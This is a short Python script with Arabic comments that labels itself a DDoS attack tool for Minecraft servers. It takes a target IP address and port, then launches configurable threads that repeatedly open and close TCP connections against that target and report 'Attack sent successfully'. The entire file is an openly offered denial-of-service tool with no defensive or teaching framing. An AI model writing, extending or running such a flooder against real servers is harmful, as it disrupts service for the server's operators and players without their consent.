import argparse
from socket import *
import time
import threading
from colorama import Fore, init

init(autoreset=True)  # تفعيل ألوان الطباعة

parser = argparse.ArgumentParser(description="DDoS attack script for a Minecraft server.")
parser.add_argument('-ip', '--ip_address', type=str, required=True, help="The IP address of the Minecraft server.")
parser.add_argument('-p', '--port', type=int, default=5000, help="The port number of the Minecraft server.")  # استخدام المنفذ 5000
parser.add_argument('-rpt', '--requests_per_thread', type=int, default=100, help="Number of requests per thread.")
parser.add_argument('-nt', '--num_threads', type=int, default=10, help="Number of threads.")
parser.add_argument('-d', '--delay', type=float, default=0.1, help="Delay between requests (in seconds).")

args = parser.parse_args()

success_printed = False  # متغير لتتبع طباعة الرسالة

def send_requests():
    global success_printed
    for _ in range(args.requests_per_thread):
        try:
            clientSocket = socket(AF_INET, SOCK_STREAM)
            clientSocket.connect((args.ip_address, args.port))
            if not success_printed:
                print(Fore.LIGHTGREEN_EX + "[!] Attack sent successfully")
                success_printed = True
            clientSocket.close()
            time.sleep(args.delay)
        except Exception as e:
            print(f'Error: {e}')
            break

threads = []
for _ in range(args.num_threads):
    thread = threading.Thread(target=send_requests)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print('All threads have finished.')